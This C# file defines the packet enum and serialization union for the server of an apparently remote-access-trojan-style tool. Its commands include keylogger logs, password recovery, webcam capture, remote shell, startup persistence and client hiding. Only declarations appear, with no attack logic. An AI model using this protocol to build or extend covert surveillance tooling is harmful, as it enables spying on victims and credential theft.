using MosaicServeur.Packets.ServerPackets;
using MosaiqueServeur.Packets.ClientPackets;
using MosaiqueServeur.Packets.ServerPackets;
using Serveur.Packets.ClientPackets;
using Serveur.Packets.ServerPackets;
using ZeroFormatter;

namespace Serveur.Packets
{
    public enum TypePackets
    {
        SetStatus, // Set Status
        Power, // Power State
        ActiveSession, // Active Session
        DoAskElevate, // Run as Administrator
        SetClientIdentifier, // Set Client Identifier
        UninstallClient, // Unisntall Client
        CloseClient, // Close Client
        GetAuthentication, GetAuthenticationResponse, SetAuthenticationSuccess, // Authentication
        GetMonitors, GetMonitorsResponse, GetDesktop, GetDesktopResponse, // Remote desktop
        GetExecuteShellCmd, GetExecuteShellCmdResponse, // Remote Shell
        GetAvailableWebcams, GetAvailableWebcamsResponse, GetWebcam, GetWebcamResponse, StopWebcam, // Remote Webcam
        GetDrives, GetDrivesResponse, SetStatusFileManager, GetDirectory, GetDirectoryResponse, DoDownloadFile, DoDownloadFileResponse, DoDownloadFileCancel, // File Manager
        GetProcesses, GetProcessesResponse, // Task Manager
        GetSysInfo, GetSysInfoResponse, // System Information
        GetStartupItems, GetStartupItemsResponse, DoStartupItemAdd, DoStartupItemRemove, // Startup Manager
        GetPasswords, GetPasswordsResponse, // Password Recovery
        GetKeyLoggerLogs, GetKeyLoggerLogsResponse, // Key Logger
        DoTrayCdOpenClose, // Tray Cd
        SendMessageBox, // Send Message Box
        MsgToRemoteChat, CloseRemoteChat, // Remote Chat
        PlaySong, // PLAY SONG
        HideShow, // Hide & Show
        DoCreateRegistryKey, DoCreateRegistryValue, DoDeleteRegistryKey, DoDeleteRegistryValue, DoRenameRegistryValue, DoLoadRegistryKey, GetRegistryKeysResponse, GetCreateRegistryKeyResponse, DoRenameRegistryKey, GetRenameRegistryKeyResponse, GetDeleteRegistryKeyResponse, GetCreateRegistryValueResponse, GetRenameRegistryValueResponse, DoChangeRegistryValue, GetChangeRegistryValueResponse, GetDeleteRegistryValueResponse   // Registry Editor
    }

    [Union(typeof(SetStatus), // Set Status
        typeof(Power), // Power State
        typeof(DoAskElevate), // Run as Administrator
        typeof(SetClientIdentifier), // Set Client Identifier
        typeof(UninstallClient), // Uninstall Client
        typeof(CloseClient), // Close Client
        typeof(GetAuthentication), typeof(GetAuthenticationResponse), typeof(SetAuthenticationSuccess), // Authentification
        typeof(GetMonitors), typeof(GetMonitorsResponse), typeof(GetDesktop), typeof(GetDesktopResponse), // Remote Desktop
        typeof(GetExecuteShellCmd), typeof(GetExecuteShellCmdResponse), // Remote Shell
        typeof(GetAvailableWebcams), typeof(GetAvailableWebcamsResponse), typeof(GetWebcam), typeof(GetWebcamResponse), typeof(StopWebcam), // Remote Webcam
        typeof(GetDrives), typeof(GetDrivesResponse), typeof(SetStatusFileManager), typeof(GetDirectory), typeof(GetDirectoryResponse), typeof(DoDownloadFile), typeof(DoDownloadFileResponse), typeof(DoDownloadFileCancel), // File Manager
        typeof(GetProcesses), typeof(GetProcessesResponse), // Task Manager
        typeof(GetSysInfo), typeof(GetSysInfoResponse), // System Information
        typeof(GetStartupItems), typeof(GetStartupItemsResponse), typeof(DoStartupItemAdd), typeof(DoStartupItemRemove), // Startup Manager
        typeof(GetPasswords), typeof(GetPasswordsResponse), // Password Recovery
        typeof(GetKeyLoggerLogs), typeof(GetKeyLoggerLogsResponse), // Key Logger
        typeof(DoTrayCdOpenClose), // Tray Cd
        typeof(SendMessageBox), // Send Message Box
        typeof(MsgToRemoteChat), typeof(CloseRemoteChat),// Remote Chat
        typeof(PlaySong), // Play Song
        typeof(HideShow), // Hide & Show
        typeof(DoCreateRegistryKey), typeof(DoCreateRegistryValue), typeof(DoDeleteRegistryKey), typeof(DoDeleteRegistryValue), typeof(DoRenameRegistryValue), typeof(DoLoadRegistryKey), typeof(GetRegistryKeysResponse), typeof(GetCreateRegistryKeyResponse), typeof(DoRenameRegistryKey), typeof(GetRenameRegistryKeyResponse), typeof(GetDeleteRegistryKeyResponse), typeof(GetCreateRegistryValueResponse), typeof(GetRenameRegistryValueResponse), typeof(DoChangeRegistryValue), typeof(GetChangeRegistryValueResponse), typeof(GetDeleteRegistryValueResponse), typeof(ActiveSession))] // Registry Editor

    public abstract class IPackets
    {
        [UnionKey]
        public abstract TypePackets Type { get; }
    }
}
